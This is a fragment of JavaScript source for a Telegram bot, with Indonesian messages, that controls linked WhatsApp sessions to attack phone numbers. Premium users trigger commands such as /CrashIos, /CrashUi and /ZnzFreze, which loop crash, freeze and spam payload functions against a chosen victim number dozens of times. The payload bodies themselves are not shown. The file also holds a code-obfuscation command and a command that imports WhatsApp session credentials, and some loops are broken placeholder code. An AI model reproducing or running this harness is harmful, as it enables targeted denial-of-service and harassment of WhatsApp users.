      };
    }

    await bot.editMessageMedia(
      {
        type: "video",
        media: "https://files.catbox.moe/lnssfg.mp4",
        caption: caption,
        parse_mode: "Markdown"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

//=======CASE BUG=========//

bot.onText(/\/ZnzFreze (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const isTarget = Jid;
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RixzzNotDev" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/yo9hh7.mp4", {
      caption: `
\`\`\`
# ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 100; i++) {   
     await VinzaIsX7Valid(sock, target);
     await sleep(500);
     await VinzaButtonSpam(sock, target);
     await sleep(800);
     await VinzaListX(sock, target);
     await sleep(1000);
     await VinzaProtocol(sock, target);
  }
  
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/ProtoX (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const mention = Jid
  const isTarget = Jid
  const target = Jid;
  
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RixzzNotDev" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/hlzeth.mp4", {
      caption: `
\`\`\`
# ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 30; i++) {   
      await newsletterSqL(target);
      await sleep(500);
      await newsletterSqL(target);
      await sleep(1000);
      await newsletterSqL(target);
      
  }
  
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/CrashIos (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const isTarget = Jid;
  const target = Jid;
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RixzzNotDev" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/8bkvtx.mp4", {
      caption: `
\`\`\`
# ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 20; i++) {   
      await pollingIos(sock, target);
      await sleep(500);
      await pollingIos(sock, target);
      await sleep(500);
      await crashIosSpammer(sock, target);
      await sleep(500);
      await crashIosSpammer(sock, target);
      
  }
  
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   


bot.onText(/\/CrashUi (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const isTarget = Jid;
  const target = Jid;
  
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RixzzNotDev" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/8bkvtx.mp4", {
      caption: `
\`\`\`
# ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 30; i++) {   
      await uiAndro(sock, target);
      await sleep(1000);
      await uiAndro(sock, target);
      
     
  }
  
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/BlankZ (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RixzzNotDev" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/8bkvtx.mp4", {
      caption: `
\`\`\`
# ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 20; i++) {   
      await OtaxDoyanJanda(sock, target);
      await sleep(1000);
      await OtaxDoyanJanda(sock, target);
      await sleep(2000);
      
      
  }
  
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/ZnzCrash (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
  
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RixzzNotDev" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/8bkvtx.mp4", {
      caption: `
\`\`\`
# ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 50; i++) {   
      await blablabla
      
      
  }
  
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/ZnzDelayZ (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RixzzNotDev" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/8bkvtx.mp4", {
      caption: `
\`\`\`
# ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 10; i++) {   
      await DelayTagSw(sock, target);
      await sleep(500);
      await uiAndro(sock, target)
      await sleep(1000);
      await DelayTagSw(sock, target);
      await sleep(5000);
      
  }
 
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/ZnzCombo (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const isTarget = target;
  const mention = target;
  
if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RixzzNotDev" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  

    const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/p5wkcb.mp4", {
      caption: `
\`\`\`
# ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : ⏳Sedang mengirim......
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 25; i++) {   
      await DelayTagSw(sock, target);
      await sleep(500);
      await crashIosSpammer(sock, target);
      await sleep(1000);
      await OtaxDoyanJanda(sock, target);
      await sleep(500);
      
  }
  
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    
 await bot.editMessageCaption(`
\`\`\`
# ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒
- ターゲット : ${formattedNumber}
- 状態 : Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});   



bot.onText(/\/encjava/, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const userId = msg.from.id.toString();
     
     if (shouldIgnoreMessage(msg)) return;
    // Cek Premium User
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RixzzNotDev" }]
      ]
    }
  });
}

   
    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(chatId, "🙈 *Error:* Balas file .js dengan `/encjava`!", { parse_mode: "Markdown" });
    }

    const file = msg.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return bot.sendMessage(chatId, "🙈 *Error:* Hanya file .js yang didukung!", { parse_mode: "Markdown" });
    }

    const encryptedPath = path.join(__dirname, `ZENZO-encrypted-${file.file_name}`);

    try {
        const progressMessage = await bot.sendMessage(chatId, "🔒 Memulai proses enkripsi...");

        await updateProgress(bot, chatId, progressMessage, 10, "Mengunduh File");

        // **Perbaikan pengambilan file dari Telegram**
        const fileData = await bot.getFile(file.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.file_path}`;
        const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
        let fileContent = response.data.toString("utf-8");

        await updateProgress(bot, chatId, progressMessage, 20, "Mengunduh Selesai");

        // Cek apakah file valid sebelum dienkripsi
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        await updateProgress(bot, chatId, progressMessage, 40, "Inisialisasi Enkripsi");

        // Proses enkripsi menggunakan Aphocalyps Chaos Core
        const obfuscated = await JsConfuser.obfuscate(fileContent, getAphocalypsObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated;

        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

        // Cek apakah hasil enkripsi valid
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(bot, chatId, progressMessage, 80, "Finalisasi Enkripsi");

        await fs.promises.writeFile(encryptedPath, obfuscatedCode);

        // Kirim file hasil enkripsi
        await bot.sendDocument(chatId, encryptedPath, {
            caption: "🔥 *File terenkripsi (ZenzoZzz Chaos Core) siap!*\n_©ZenzoZzz ENC_",
            parse_mode: "Markdown"
        });

        await updateProgress(bot, chatId, progressMessage, 100, "Zenzo Chaos Core Selesai");

        // Hapus file setelah dikirim
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {
            console.error("Gagal menghapus file:", err.message);
        }
    } catch (error) {
        await bot.sendMessage(chatId, `🙈 *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`, { parse_mode: "Markdown" });

        // Hapus file jika ada error
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {
            console.error("Gagal menghapus file:", err.message);
        }
    }
});

bot.onText(/\/add(?:\s+(.+))?$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const input = match[1];
    if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, '❌ Hanya owner.')
    if (!input) {
        return bot.sendMessage(chatId, `❌ <code>Add {json}</code>`, { parse_mode: 'HTML' });
    }
    let sessionData;
    try {
        sessionData = JSON.parse(input);
    } catch (e) {
        return bot.sendMessage(chatId, `❌ Coba ulangi dengan benar.`, { parse_mode: 'HTML' });
    }
    const rawId = sessionData?.me?.id;
    const cleanId = rawId.split(':')[0];
    const number = cleanId.split('@')[0];
    const kontol = saveActiveSessions(number);
    const devicePath = createSessionDir(number);
    const filePath = path.join(devicePath, 'creds.json');
    try {
        fs.writeFileSync(filePath, JSON.stringify(sessionData));
        await useMultiFileAuthState(devicePath);
        await connectToWhatsApp(number, chatId);
        bot.sendMessage(chatId, `<blockquote><b>Session berhasil dibuat: </b><code>${number}</code></blockquote>\n<pre>X TUNGGU 10 TAHUN</pre>`, { parse_mode: 'HTML' });
    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, `❌ Gagal menyimpan session device${number}`, { parse_mode: 'HTML' });
    }
});

bot.onText(/\/tofunc$/, async (msg) => {
    const chatId = msg.chat.id;
    if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
    if (!sock || typeof sock.sendMessage !== 'function') {
        return bot.sendMessage(chatId, '❌ WhatsApp session not available or not connected!', {
            reply_to_message_id: msg.message_id
        });
    }
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Reply pesan yang berisi media!', {
            reply_to_message_id: msg.message_id
        });
    }
    try {
        const repliedMsg = msg.reply_to_message;
        const mediaTypes = ['photo', 'video', 'document', 'audio', 'sticker'];
        if (!mediaTypes.some(type => repliedMsg[type])) {
            return bot.sendMessage(chatId, '❌ Pesan yang dibalas tidak mengandung media!', {
                reply_to_message_id: msg.message_id
            });
        }
        let fileId;
        let whatsappType;
        if (repliedMsg.photo) {
            fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
            whatsappType = 'image';
        } else if (repliedMsg.video) {
            fileId = repliedMsg.video.file_id;
            whatsappType = 'video';
        } else if (repliedMsg.document) {
            fileId = repliedMsg.document.file_id;
            whatsappType = 'document';
        } else if (repliedMsg.audio) {
            fileId = repliedMsg.audio.file_id;
            whatsappType = repliedMsg.audio.mime_type?.startsWith('audio/ogg') ? 'ptt' : 'audio';
        } else if (repliedMsg.sticker) {
            fileId = repliedMsg.sticker.file_id;
            whatsappType = 'sticker';
        }
        const fileInfo = await bot.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}`;
        let mime = 'application/octet-stream';
        if (repliedMsg[whatsappType]?.mime_type) {
            mime = repliedMsg[whatsappType].mime_type;
        } else if (whatsappType === 'sticker') {
            mime = repliedMsg.sticker.is_animated ? 'application/x-tgs' : 'image/webp';
        }
        const mediaPayload = {
            [whatsappType]: {
                url: fileUrl,
                mimetype: mime
            }
        };
        const sentMsg = await sock.sendMessage(sock.user.id, mediaPayload);
        if (!sentMsg?.message) {
            throw new Error('Failed to send media - no response from WhatsApp');
        }
        const messageType = Object.keys(sentMsg.message)[0];
        const media = sentMsg.message[messageType];
        await bot.sendMessage(
            chatId,
            `\`\`\`json
type: "${messageType}",
url: "${media.url || null}",
directPath: "${media.directPath || null}",
mimetype: "${media.mimetype || null}",
mediaKey: "${media.mediaKey?.toString('base64') || null}",
fileEncSha256: "${media.fileEncSha256?.toString('base64') || null}",
fileSha256: "${media.fileSha256?.toString('base64') || null}",
fileLength: "${media.fileLength || null}",
mediaKeyTimestamp: "${media.mediaKeyTimestamp || null}"\`\`\``,
            {
                reply_to_message_id: msg.message_id,
                parse_mode: "Markdown",
                reply_markup: {
            inline_keyboard: [
                [
                 { text: "Developer", url: "t.me/RixzzNotDev" }
               ]
            ]
         }
      });
    } catch (err) {
        console.error('Error in /tobase command:', err);    
        let errorMsg = '❌ Gagal mengirim media.';
        if (err.message.includes('not connected')) {
            errorMsg = '❌ WhatsApp session not connected!';
        } else if (err.message.includes('ENOENT')) {
